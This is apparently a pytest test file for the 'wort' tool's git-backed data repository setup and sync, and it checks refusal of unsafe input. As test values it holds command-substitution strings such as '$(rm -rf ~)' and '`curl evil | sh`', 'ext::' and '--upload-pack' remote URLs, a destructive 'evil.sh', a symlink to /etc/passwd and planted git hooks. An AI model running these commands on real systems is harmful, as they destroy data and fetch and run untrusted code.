"""`wort init-data` and `wort sync`, against a local bare repository standing in for GitHub."""

import os
import subprocess
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from wort import cli, dataschema, datarepo, paths
from wort.history import HistoryStore

T0 = datetime(2026, 11, 21, 12, 0, 0, tzinfo=timezone.utc)


@pytest.fixture(autouse=True)
def _git_home(tmp_path, monkeypatch):
    """A private HOME with a git identity, so no test reads or writes the real git configuration."""
    home = tmp_path / "githome"
    home.mkdir()
    (home / ".gitconfig").write_text("[user]\n\tname = Test\n\temail = test@example.com\n[init]\n\tdefaultBranch = main\n")
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("GIT_DIR", raising=False)


def git(cwd, *args, check=True):
    proc = subprocess.run(["git", "-C", str(cwd), *args], capture_output=True, text=True, env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
    if check and proc.returncode:
        raise AssertionError(f"git {args}: {proc.stderr}")
    return proc.stdout.strip()


@pytest.fixture
def remote(tmp_path) -> Path:
    path = tmp_path / "remote.git"
    subprocess.run(["git", "init", "--bare", "-b", "main", str(path)], check=True, capture_output=True)
    return path


@pytest.fixture
def repo(tmp_path, remote) -> Path:
    root = tmp_path / "data"
    datarepo.init(root, str(remote))
    return root


def add(root: Path, kind: str, text: str, n: int = 0, found: bool = True):
    HistoryStore(root).add(kind, text, found, now=T0 + timedelta(seconds=n))


def clone(tmp_path, remote, name="other") -> Path:
    target = tmp_path / name
    subprocess.run(["git", "clone", "-q", str(remote), str(target)], check=True, capture_output=True)
    return target


# --- init-data ------------------------------------------------------------------------------------------


def test_init_creates_the_scaffold_and_one_commit(repo, remote):
    tracked = set(git(repo, "ls-files").split("\n"))
    assert tracked == {"README.md", ".gitattributes", ".gitignore", "validate.py", "words.jsonl", "sentences.jsonl", ".github/workflows/validate.yml"}
    assert tracked == dataschema.REPO_FILES
    assert git(repo, "rev-list", "--count", "HEAD") == "1" and git(repo, "symbolic-ref", "--short", "HEAD") == "main"
    assert git(repo, "remote", "get-url", "origin") == str(remote)
    assert (repo / "validate.py").read_bytes() == datarepo.packaged_validator()


def test_init_is_idempotent_and_refreshes_the_validator(repo):
    assert datarepo.init(repo) == ["Everything is up to date."]
    (repo / "validate.py").write_text("# an old copy\n")  # a damaged local copy is simply restored
    assert datarepo.init(repo) == ["Everything is up to date."] and (repo / "validate.py").read_bytes() == datarepo.packaged_validator()
    (repo / "validate.py").write_text("# an old copy\n")  # ...and an old committed copy is refreshed with a commit
    git(repo, "commit", "-q", "-am", "old validator")
    notes = datarepo.init(repo)
    assert any("Committed" in n for n in notes) and (repo / "validate.py").read_bytes() == datarepo.packaged_validator()
    assert git(repo, "rev-list", "--count", "HEAD") == "3"


def test_init_keeps_existing_history_files(tmp_path, remote):
    root = tmp_path / "data"
    add(root, "word", "Haus")  # wort ran before the repository was set up
    datarepo.init(root, str(remote))
    assert [e.text for e in HistoryStore(root).read("word")] == ["Haus"]
    assert "words.jsonl" in git(root, "ls-files")


def test_init_refuses_a_history_file_that_breaks_the_rules(tmp_path):
    root = tmp_path / "data"
    root.mkdir()
    (root / "words.jsonl").write_text('{"text":"$(id)","ts":"2026-11-21T12:00:00Z","found":true}\n')
    with pytest.raises(datarepo.SyncError, match="words.jsonl: line 1"):
        datarepo.init(root)
    assert not (root / ".git" / "refs" / "heads" / "main").exists()  # no commit was made


@pytest.mark.parametrize("url", ["ext::sh -c touch /tmp/pwned", "--upload-pack=x", "file:///etc", "ftp://x/y", "fd::3", "x"])
def test_init_refuses_odd_remote_urls(tmp_path, url):
    with pytest.raises(datarepo.SyncError, match="remote must be"):
        datarepo.init(tmp_path / "data", url)


def test_init_does_not_replace_a_different_remote(repo, tmp_path):
    with pytest.raises(datarepo.SyncError, match="already points to"):
        datarepo.init(repo, "https://github.com/someone/else.git")


def test_untracked_files_stay_untracked(repo):
    (repo / "evil.sh").write_text("rm -rf ~\n")
    datarepo.init(repo)
    assert "evil.sh" not in git(repo, "ls-files") and "evil.sh" not in git(repo, "status", "--porcelain")  # ignored


# --- sync: the normal flow ------------------------------------------------------------------------------


def test_first_sync_pushes_to_an_empty_remote(repo, remote):
    add(repo, "word", "Haus")
    add(repo, "sentence", "Ich gehe nach Hause.")
    line = datarepo.sync(repo)
    assert "Synced 1 words and 1 sentences" in line
    assert git(remote, "rev-parse", "main") == git(repo, "rev-parse", "HEAD")
    assert git(remote, "show", "main:words.jsonl") == '{"text":"Haus","ts":"2026-11-21T12:00:00Z","found":true}'
    assert set(git(remote, "ls-tree", "-r", "--name-only", "main").split("\n")) == dataschema.REPO_FILES


def test_a_second_sync_with_nothing_new_changes_nothing(repo, remote):
    add(repo, "word", "Haus")
    datarepo.sync(repo)
    head = git(repo, "rev-parse", "HEAD")
    assert "Already in sync" in datarepo.sync(repo)
    assert git(repo, "rev-parse", "HEAD") == head == git(remote, "rev-parse", "main")


def test_sync_commits_only_the_two_history_files(repo, remote):
    datarepo.sync(repo)
    (repo / "README.md").write_text("changed but not committed\n")
    git(repo, "add", "README.md")  # staged by someone else: must not ride along
    add(repo, "word", "Katze")
    datarepo.sync(repo)
    assert git(repo, "show", "--name-only", "--format=", "HEAD").split("\n") == ["words.jsonl"]
    assert git(remote, "show", "main:README.md") != "changed but not committed"


def test_an_empty_history_syncs_the_scaffold_only(repo, remote):
    assert "Synced 0 words and 0 sentences" in datarepo.sync(repo)
    assert git(remote, "rev-parse", "main") == git(repo, "rev-parse", "HEAD")


# --- sync: what stops it --------------------------------------------------------------------------------


def test_a_bad_local_line_stops_everything(repo, remote):
    add(repo, "word", "Haus")
    datarepo.sync(repo)
    head = git(repo, "rev-parse", "HEAD")
    with open(repo / "words.jsonl", "a") as f:
        f.write('{"text":"$(rm -rf ~)","ts":"2026-11-21T12:00:00Z","found":true}\n')
    with pytest.raises(datarepo.SyncError, match=r"words.jsonl: line 2: character not allowed"):
        datarepo.sync(repo)
    assert git(repo, "rev-parse", "HEAD") == head == git(remote, "rev-parse", "main")  # no commit, no push


def test_local_validator_must_match_wort(repo):
    (repo / "validate.py").write_text("print('weaker rules')\n")
    with pytest.raises(datarepo.SyncError, match="not wort's current rule file"):
        datarepo.sync(repo)
    (repo / "validate.py").unlink()
    with pytest.raises(datarepo.SyncError, match="validate.py is missing"):
        datarepo.sync(repo)


def _push_from_other(tmp_path, remote, mutate, message="other machine"):
    other = clone(tmp_path, remote)
    mutate(other)
    git(other, "add", "-f", "-A")
    git(other, "commit", "-q", "-m", message)
    git(other, "push", "-q", "origin", "main")
    return other


def _published_base(repo, remote):
    add(repo, "word", "Haus")
    datarepo.sync(repo)
    return git(repo, "rev-parse", "HEAD")


@pytest.mark.parametrize("name", ["evil.sh", "run.py", "notes.txt", ".env", "data/words.jsonl", ".github/workflows/other.yml"])
def test_a_foreign_file_on_the_remote_is_refused_before_anything_is_merged(tmp_path, repo, remote, name):
    head = _published_base(repo, remote)

    def mutate(other):
        path = other / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("#!/bin/sh\nrm -rf ~\n")

    _push_from_other(tmp_path, remote, mutate)
    with pytest.raises(datarepo.SyncError, match="not an allowed file; refusing to merge"):
        datarepo.sync(repo)
    assert git(repo, "rev-parse", "HEAD") == head and not (repo / name).exists()  # nothing was checked out


def test_a_bad_line_on_the_remote_is_refused(tmp_path, repo, remote):
    head = _published_base(repo, remote)

    def mutate(other):
        with open(other / "words.jsonl", "a") as f:
            f.write('{"text":"`curl evil | sh`","ts":"2026-11-21T12:00:01Z","found":true}\n')

    _push_from_other(tmp_path, remote, mutate)
    with pytest.raises(datarepo.SyncError, match=r"words.jsonl: line 2: character not allowed.*refusing to merge"):
        datarepo.sync(repo)
    assert git(repo, "rev-parse", "HEAD") == head and "curl" not in (repo / "words.jsonl").read_text()


def test_a_symlink_or_executable_on_the_remote_is_refused(tmp_path, repo, remote):
    head = _published_base(repo, remote)

    def link(other):
        (other / "sentences.jsonl").unlink()
        (other / "sentences.jsonl").symlink_to("/etc/passwd")

    other = _push_from_other(tmp_path, remote, link, "symlink")
    with pytest.raises(datarepo.SyncError, match="not a plain file \\(mode 120000\\)"):
        datarepo.sync(repo)
    git(other, "reset", "-q", "--hard", head)
    (other / "validate.py").chmod(0o755)
    git(other, "add", "-f", "validate.py")
    git(other, "commit", "-q", "-m", "exec")
    git(other, "push", "-q", "-f", "origin", "main")
    with pytest.raises(datarepo.SyncError, match="not a plain file \\(mode 100755\\)"):
        datarepo.sync(repo)
    assert git(repo, "rev-parse", "HEAD") == head


def test_a_huge_file_on_the_remote_is_refused(tmp_path, repo, remote, monkeypatch):
    _published_base(repo, remote)
    _push_from_other(tmp_path, remote, lambda other: (other / "README.md").write_text("x" * 70_000))
    with pytest.raises(datarepo.SyncError, match="README.md is too large"):
        datarepo.sync(repo)


# --- sync: two machines ---------------------------------------------------------------------------------


def test_two_machines_adding_different_entries_end_up_with_both(tmp_path, repo, remote, monkeypatch):
    _published_base(repo, remote)
    other = clone(tmp_path, remote)
    add(other, "word", "Katze", 10)
    add(other, "sentence", "Die Katze schläft.", 10)
    datarepo.sync(other)

    add(repo, "word", "Hund", 20)
    datarepo.sync(repo)  # merges the other machine's lines, then pushes

    for where in (repo, remote):
        words = git(where, "show", "HEAD:words.jsonl" if where == repo else "main:words.jsonl")
        assert all(w in words for w in ('"Haus"', '"Katze"', '"Hund"'))
    assert [e.text for e in HistoryStore(repo).read("sentence")] == ["Die Katze schläft."]
    assert dataschema.check_tree(repo) == {"words.jsonl": 3, "sentences.jsonl": 1}
    assert git(remote, "rev-parse", "main") == git(repo, "rev-parse", "HEAD")


def test_remote_ahead_only_is_a_fast_forward(tmp_path, repo, remote):
    _published_base(repo, remote)
    other = clone(tmp_path, remote)
    add(other, "word", "Katze", 10)
    datarepo.sync(other)
    assert "Already in sync" in datarepo.sync(repo)
    assert "Katze" in (repo / "words.jsonl").read_text() and git(repo, "rev-list", "--merges", "--count", "HEAD") == "0"


def test_a_merge_conflict_is_aborted_and_nothing_changes(tmp_path, repo, remote):
    _published_base(repo, remote)
    _push_from_other(tmp_path, remote, lambda other: (other / "README.md").write_text("their readme\n"))
    (repo / "README.md").write_text("our readme\n")
    git(repo, "commit", "-q", "-am", "ours")
    add(repo, "word", "Katze", 5)
    with pytest.raises(datarepo.SyncError, match="merging .* failed"):
        datarepo.sync(repo)
    assert git(repo, "status", "--porcelain") == "" and not (repo / ".git" / "MERGE_HEAD").exists()
    assert (repo / "README.md").read_text() == "our readme\n"


def test_a_repository_without_commits_does_not_silently_overwrite_the_remote_history(tmp_path, remote):
    seed = tmp_path / "seed"
    datarepo.init(seed, str(remote))
    add(seed, "word", "Haus")
    datarepo.sync(seed)

    fresh = tmp_path / "fresh"
    fresh.mkdir()
    git(fresh, "init", "-q", "-b", "main")
    git(fresh, "remote", "add", "origin", str(remote))
    (fresh / "validate.py").write_bytes(datarepo.packaged_validator())
    with pytest.raises(datarepo.SyncError, match="clone the data repository instead"):
        datarepo.sync(fresh)


# --- sync: the setup it insists on ----------------------------------------------------------------------


def test_sync_needs_a_repository_of_its_own(tmp_path):
    with pytest.raises(datarepo.SyncError, match="does not exist"):
        datarepo.sync(tmp_path / "nowhere")
    plain = tmp_path / "plain"
    plain.mkdir()
    with pytest.raises(datarepo.SyncError, match="not a git repository of its own"):
        datarepo.sync(plain)
    inner = tmp_path / "data" / "inner"  # inside another repository: not its own top level
    outer = tmp_path / "data"
    datarepo.init(outer)
    inner.mkdir()
    with pytest.raises(datarepo.SyncError, match="not a git repository of its own"):
        datarepo.sync(inner)


def test_sync_needs_the_main_branch_and_a_remote(tmp_path, remote):
    root = tmp_path / "data"
    datarepo.init(root)  # no remote yet
    with pytest.raises(datarepo.SyncError, match="no remote named origin"):
        datarepo.sync(root)
    git(root, "remote", "add", "origin", str(remote))
    git(root, "checkout", "-q", "-b", "side")
    with pytest.raises(datarepo.SyncError, match="not on the branch main"):
        datarepo.sync(root)


def test_a_dangerous_remote_url_is_refused(repo):
    git(repo, "remote", "set-url", "origin", "ext::sh -c 'touch /tmp/pwned'")
    with pytest.raises(datarepo.SyncError, match="not an https, ssh or local path"):
        datarepo.sync(repo)
    assert not Path("/tmp/pwned").exists()


def test_tokens_in_a_url_are_never_shown():
    assert datarepo._plain_url("https://user:ghp_secret@github.com/x/y.git") == "https://github.com/x/y.git"
    assert datarepo._plain_url("git@github.com:x/y.git") == "git@github.com:x/y.git"


# --- git is run defensively -----------------------------------------------------------------------------


def test_hooks_of_the_data_repository_never_run(tmp_path, repo, remote):
    marker = tmp_path / "hook-ran"
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    for name in ("pre-commit", "commit-msg", "pre-push", "pre-merge-commit", "post-merge", "post-commit"):
        (hooks / name).write_text(f"#!/bin/sh\ntouch {marker}\n")
        (hooks / name).chmod(0o755)
    git(repo, "config", "core.hooksPath", str(hooks))
    (repo / ".git" / "hooks" / "pre-commit").write_text(f"#!/bin/sh\ntouch {marker}\n")
    (repo / ".git" / "hooks" / "pre-commit").chmod(0o755)
    add(repo, "word", "Haus")
    datarepo.sync(repo)
    assert git(remote, "rev-parse", "main") and not marker.exists()


def test_git_environment_variables_cannot_redirect_it(tmp_path, repo, remote, monkeypatch):
    monkeypatch.setenv("GIT_DIR", str(tmp_path / "elsewhere"))
    monkeypatch.setenv("GIT_WORK_TREE", str(tmp_path / "elsewhere"))
    add(repo, "word", "Haus")
    assert "Synced" in datarepo.sync(repo)
    assert set(datarepo._env()) <= set(datarepo.ENV_KEPT) | {"GIT_TERMINAL_PROMPT", "GIT_OPTIONAL_LOCKS"}


def test_git_is_called_without_a_shell_and_with_a_timeout(monkeypatch, repo):
    seen = []
    real = subprocess.run

    def spy(cmd, **kwargs):
        seen.append((cmd, kwargs))
        return real(cmd, **kwargs)

    monkeypatch.setattr(subprocess, "run", spy)
    datarepo.sync(repo)
    assert seen and all(isinstance(cmd, list) and cmd[0] == "git" and not kwargs.get("shell") and kwargs["timeout"] for cmd, kwargs in seen)
    assert all("core.hooksPath=/dev/null" in cmd for cmd, _ in seen)
    assert all(arg not in ("--force", "-f", "--force-with-lease") for cmd, _ in seen for arg in cmd)
    assert all(cmd[cmd.index("add") + 1] != "-A" for cmd, _ in seen if "add" in cmd[4:])


def test_git_missing_and_timeouts_are_reported(monkeypatch, repo):
    def missing(*a, **k):
        raise FileNotFoundError

    monkeypatch.setattr(subprocess, "run", missing)
    with pytest.raises(datarepo.SyncError, match="git is not installed"):
        datarepo.sync(repo)

    def slow(cmd, **k):
        raise subprocess.TimeoutExpired(cmd, k["timeout"])

    monkeypatch.setattr(subprocess, "run", slow)
    with pytest.raises(datarepo.SyncError, match="did not finish within"):
        datarepo.sync(repo)


# --- the commands ---------------------------------------------------------------------------------------


def test_the_sync_command(repo, remote, capsys):
    add(repo, "word", "Haus")
    cli.main(["sync"])
    assert "Synced 1 words and 0 sentences" in capsys.readouterr().out
    assert git(remote, "rev-parse", "main") == git(repo, "rev-parse", "HEAD")


def test_the_sync_command_fails_loudly(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("WORT_DATA_REPO", str(tmp_path / "nowhere"))
    with pytest.raises(SystemExit) as exit_:
        cli.main(["sync"])
    assert exit_.value.code == 1 and "Sync failed:" in capsys.readouterr().out


def test_the_init_data_command(tmp_path, remote, capsys):
    target = tmp_path / "mine"
    cli.main(["init-data", str(target), "--remote", str(remote)])
    out = capsys.readouterr().out
    assert "Created a git repository" in out and "Committed the scaffold" in out and (target / "validate.py").is_file()
    cli.main(["init-data", str(target)])
    assert "Everything is up to date." in capsys.readouterr().out
    assert paths.data_repo() != target  # the default location is untouched
